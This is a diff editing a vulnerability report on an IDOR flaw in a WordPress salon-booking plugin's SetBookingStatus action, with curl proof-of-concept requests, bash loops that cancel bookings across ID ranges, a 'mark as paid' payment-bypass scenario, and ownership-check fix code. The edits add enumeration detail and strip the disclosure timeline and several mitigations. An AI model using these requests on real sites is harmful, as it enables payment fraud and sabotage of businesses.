@@ -1,7 +1,6 @@
 # Security Vulnerability Report: IDOR in SetBookingStatus
 
 **Report Date:** 2025-11-15
-**Researcher:** [Your Name/Handle]
 **Vendor:** Salon Booking System
 **Product:** Salon Booking System WordPress Plugin (PRO Version)
 **Affected Versions:** 10.30.3 (likely affects earlier versions)
@@ -13,12 +12,12 @@
 
 ## Executive Summary
 
-An Insecure Direct Object Reference (IDOR) vulnerability exists in the PRO version of the Salon Booking System WordPress plugin. The `SetBookingStatus` AJAX action allows any authenticated user to modify the status of any booking in the system without proper authorization checks. This enables attackers to cancel legitimate bookings, confirm unpaid bookings, or disrupt business operations.
+An Insecure Direct Object Reference (IDOR) vulnerability exists in the PRO version of the Salon Booking System WordPress plugin. The `SetBookingStatus` AJAX action allows any authenticated user to modify the status of any booking in the system without proper authorization checks. This enables attackers to cancel legitimate bookings, mark unpaid bookings as paid, or disrupt business operations.
 
 **Impact:**
 - Business disruption through mass booking cancellations
 - Revenue loss from unauthorized status changes
-- Payment bypass by confirming bookings without payment
+- Payment bypass by marking bookings as paid without payment
 - Customer dissatisfaction from unexpected cancellations
 
 **Note:** This vulnerability **only affects the PRO version** of the plugin. The FREE version disables this functionality via a feature flag check.
@@ -83,6 +82,58 @@ public function execute()
 
 ---
 
+## Booking ID Enumeration
+
+### Sequential WordPress Post IDs
+
+Bookings are stored as WordPress custom post type `sln_booking`. WordPress assigns sequential integer IDs to all posts:
+
+```php
+// From Plugin.php
+const POST_TYPE_BOOKING = 'sln_booking';
+
+// WordPress creates posts with sequential IDs
+wp_insert_post(array('post_type' => 'sln_booking'));
+// Returns: 1, 2, 3, 4, 5, 6, 7... (sequential)
+```
+
+**Example Site Structure:**
+- Pages (IDs 1-10)
+- Posts (IDs 11-50)
+- Bookings (IDs 51-250)
+- Other content (IDs 251+)
+
+**Result:** Booking IDs are completely predictable and easily enumerable.
+
+### IDs Exposed to Users
+
+**File:** `views/shortcode/salon_my_account/_salon_my_account_details_table_rows.php` (Line 3-7)
+
+```php
+<article id="sln-account__booking--<?php echo $item['id'] ?>" class="sln-account__booking">
+    <header class="sln-account__card__header">
+        <h4 class="sln-account__card__header__el">
+            <?php echo $item['id'] ?>  <!-- Displays: "123" -->
+            <small><?php esc_html_e('Booking ID', 'salon-booking-system');?></small>
+        </h4>
+    </header>
+</article>
+```
+
+**What attackers see in "My Account" page:**
+```
+Booking ID
+123
+```
+
+**Enumeration Strategy:**
+- User creates one booking, sees ID 457
+- Infers IDs 450-465 likely exist
+- Can target all nearby bookings
+- Can brute force entire range (1-10000)
+
+---
+
 ## Proof of Concept
 
 ### Prerequisites
@@ -94,10 +145,7 @@ public function execute()
 
 **Step 1:** Attacker creates an account and logs in to obtain session cookies.
 
-**Step 2:** Attacker identifies target booking IDs through enumeration:
-- Booking IDs are sequential WordPress post IDs (1, 2, 3, 4...)
-- IDs are visible in user's "My Account" page
-- Attacker can infer nearby IDs exist
+**Step 2:** Attacker identifies target booking ID (displayed in their own "My Account" page: "Booking ID: 457")
 
 **Step 3:** Attacker sends AJAX request to modify victim's booking:
 
@@ -119,19 +167,19 @@ curl -X POST 'https://target-salon.com/wp-admin/admin-ajax.php' \
 }
 ```
 
-The victim's booking is now canceled without authorization. The victim receives a cancellation email, the time slot is freed, and the salon loses revenue.
+The victim's booking is now canceled without authorization.
 
 ### Alternative Attack: Payment Bypass
 
-Attacker creates a booking but doesn't complete payment, then confirms it:
+Attacker creates a booking requiring payment, then marks it as paid without actually paying:
 
 ```bash
 curl -X POST 'https://target-salon.com/wp-admin/admin-ajax.php' \
   -H 'Cookie: wordpress_logged_in_attacker...' \
-  --data 'action=salon&method=SetBookingStatus&booking_id=123&status=sln-b-confirmed'
+  --data 'action=salon&method=SetBookingStatus&booking_id=123&status=sln-b-paid'
 ```
 
-The booking appears as confirmed in the salon's calendar despite no payment being received.
+**Result:** Booking shows as "Paid" in salon's calendar despite no payment received. Attacker receives free service.
 
 ---
 
@@ -140,7 +188,6 @@ The booking appears as confirmed in the salon's calendar despite no payment bein
 ### Scenario 1: Competitor Sabotage
 **Objective:** Disrupt a competing salon's business
 
-**Method:**
 ```bash
 # Cancel all bookings for a specific date range
 for booking_id in {450..550}; do
@@ -156,29 +203,34 @@ done
 - Customers receive unexpected cancellation emails
 - Customers rebook with competitors
 - Revenue loss in thousands of dollars
-- Reputation damage
 
-### Scenario 2: Automated Mass Disruption
-**Objective:** Maximize damage through automated attacks
+### Scenario 2: Payment Bypass
+**Objective:** Obtain services without payment
+
+**Method:**
+1. Create booking for expensive service ($200 haircut + color)
+2. Skip payment step
+3. Use SetBookingStatus to mark as paid: `status=sln-b-paid`
+4. Attend appointment expecting free service
+
+**Impact:**
+- Direct revenue loss per fraudulent booking
+- Inventory/product loss
+
+### Scenario 3: Mass Disruption
+**Objective:** Maximum business damage
+
+```bash
+# Cancel all bookings in system
+for id in {1..5000}; do
+  curl --data "booking_id=$id&status=sln-b-canceled" &
+done
+```
 
 **Impact:**
 - Complete calendar disruption
 - Email flooding to all customers
-- System resource exhaustion
 - Business shutdown
-
-### Scenario 3: Free Services
-**Objective:** Obtain services without payment
-
-**Method:**
-1. Create booking for expensive service
-2. Skip payment step
-3. Use SetBookingStatus to confirm booking
-4. Attend appointment expecting free service
-
-**Impact:**
-- Direct revenue loss
-- Inventory/time slot theft
 
 ---
 
@@ -208,8 +260,6 @@ public function execute()
     // ✅ VALIDATES OWNERSHIP BEFORE ALLOWING ACTION
     if ($cancellationEnabled && !$outOfTime && $available) {
         $booking->setStatus(SLN_Enum_BookingStatus::CANCELED);
-        $booking = $plugin->createBooking(intval($_POST['id']));
-        $plugin->getBookingCache()->processBooking($booking);
     } elseif (!$available) {
         // ✅ RETURNS ERROR IF NOT AUTHORIZED
         $this->addError(__("You don't have access", 'salon-booking-system'));
@@ -225,6 +275,7 @@ public function execute()
 
 ### Business Impact
 - **Revenue Loss:** Canceled bookings result in direct revenue loss
+- **Payment Fraud:** Attackers can mark bookings as paid without payment
 - **Customer Trust:** Unexpected cancellations damage customer relationships
 - **Operational Disruption:** Mass cancellations disrupt scheduling and operations
 - **Competitive Harm:** Competitors could weaponize this vulnerability
@@ -233,11 +284,6 @@ public function execute()
 - **Data Integrity:** Unauthorized modification of booking records
 - **Access Control Bypass:** Horizontal privilege escalation
 - **Audit Trail Pollution:** Unauthorized changes create false audit records
-
-### Affected Parties
-- **Salon Owners:** Business disruption and revenue loss
-- **Customers:** Service disruption and confusion
-- **Plugin Vendor:** Reputation damage and potential liability
 
 ---
 
@@ -258,15 +304,13 @@ public function execute()
 | Integrity (I) | High (H) | Complete control over booking statuses |
 | Availability (A) | High (H) | Can cancel all bookings (denial of service) |
 
-**Severity:** CRITICAL for business-critical applications
-
 ---
 
 ## Recommended Remediation
 
-### Immediate Fix (Priority 1)
+### Immediate Fix
 
-Add ownership validation to `SetBookingStatus` function:
+Add ownership validation to `SetBookingStatus` function (use same pattern as `CancelBooking`):
 
 ```php
 public function execute()
@@ -287,7 +331,7 @@ public function execute()
 
     $booking = $plugin->createBooking(intval($_POST['booking_id']));
 
-    // ✅ ADD OWNERSHIP CHECK (pattern from CancelBooking)
+    // ✅ ADD OWNERSHIP CHECK (same pattern as CancelBooking.php line 18)
     $available = $booking->getUserId() == get_current_user_id();
 
     // ✅ ADD ADMIN CAPABILITY CHECK (for legitimate admin use)
@@ -317,17 +361,9 @@ public function execute()
 }
 ```
 
-### Additional Security Improvements (Priority 2)
+### Additional Security Improvements
 
-**1. Add CSRF Protection:**
-```php
-// Verify nonce
-if (!check_ajax_referer('sln_booking_status_' . intval($_POST['booking_id']), 'nonce', false)) {
-    return array('success' => 0, 'error' => 'Invalid request');
-}
-```
-
-**2. Use Secure Booking Identifiers:**
+**Use Secure Booking Identifiers:**
 
 Instead of sequential integer IDs, use the existing `getUniqueId()` system:
 
@@ -339,7 +375,7 @@ $booking = $plugin->createBooking(intval($_POST['booking_id']));
 $booking = $plugin->createBooking($_POST['booking_id']); // "123-abc456def"
 ```
 
-The `createBooking()` function already validates unique IDs (line 92-94 of Plugin.php):
+The `createBooking()` function already validates unique IDs (Plugin.php lines 92-94):
 
 ```php
 if (isset($secureId) && $ret->getUniqueId() != $secureId) {
@@ -347,13 +383,21 @@ if (isset($secureId) && $ret->getUniqueId() != $secureId) {
 }
 ```
 
-**3. Add Rate Limiting:**
+**Unique ID Generation** (Booking.php lines 550-559):
 
-Implement rate limiting to prevent mass enumeration attacks.
+```php
+public function getUniqueId()
+{
+    $id = $this->getMeta('uniqid');
+    if (!$id) {
+        $id = md5(uniqid().$this->getId());  // Random hash
+        $this->setMeta('uniqid', $id);
+    }
+    return $this->getId().'-'.$id;  // Returns "123-abc456def789"
+}
+```
 
-**4. Add Audit Logging:**
-
-Log all booking status changes with user information for forensic analysis.
+This would prevent enumeration attacks since attackers cannot guess the hash component.
 
 ---
 
@@ -381,78 +425,6 @@ When users purchase the PRO version, `SLN_VERSION_PAY` is defined (likely in a s
 - Bypasses the early return on lines 14-16
 - Enables execution of vulnerable code on lines 22-35
 - Exposes the IDOR vulnerability
-
-**Confirmation Method:**
-
-Check if `SLN_VERSION_PAY` constant is defined:
-```php
-if (defined('SLN_VERSION_PAY')) {
-    // PRO version - vulnerable
-} else {
-    // FREE version - not vulnerable
-}
-```
-
----
-
-## Disclosure Timeline
-
-**Recommended Timeline:**
-
-- **Day 0:** Initial vendor notification with embargo details
-- **Day 7:** Vendor acknowledgment expected
-- **Day 30:** Vendor provides patch timeline
-- **Day 60:** Vendor releases security patch
-- **Day 90:** Public disclosure if patch available
-- **Day 120:** Public disclosure regardless of patch status (with user advisory)
-
----
-
-## References
-
-- **OWASP Top 10 2021:** A01:2021 – Broken Access Control
-- **CWE-639:** Authorization Bypass Through User-Controlled Key
-- **CWE-284:** Improper Access Control
-- **CVSS 3.1 Calculator:** https://www.first.org/cvss/calculator/3.1
-
----
-
-## Researcher Notes
-
-### Testing Environment
-- WordPress Version: 6.x
-- Plugin Version: 10.30.3 (FREE version codebase analyzed)
-- PHP Version: 7.4+
-
-### Additional Findings
-
-While analyzing this vulnerability, the following related issues were identified:
-
-1. **Missing CSRF Protection:** SetBookingStatus lacks nonce verification
-2. **Debug Mode Toggle:** Unauthenticated users can enable debug mode (medium severity)
-3. **SSRF in Image Upload:** Server-Side Request Forgery via arbitrary URL fetching (critical severity)
-4. **Unauthenticated Booking Duplication:** DuplicateClone lacks authentication (needs verification if PRO-only)
-
-These additional vulnerabilities should be addressed in a comprehensive security patch.
-
----
-
-## Contact Information
-
-**Vendor Contact:**
-- Website: https://salonbookingsystem.com
-- Support: [To be determined]
-
-**Researcher Contact:**
-- [Your Name/Organization]
-- [Your Email]
-- [PGP Key if applicable]
-
----
-
-## Acknowledgments
-
-This vulnerability was discovered through responsible security research. No exploitation of production systems was performed. All testing was conducted in isolated laboratory environments using the publicly available FREE version codebase.
 
 ---
 
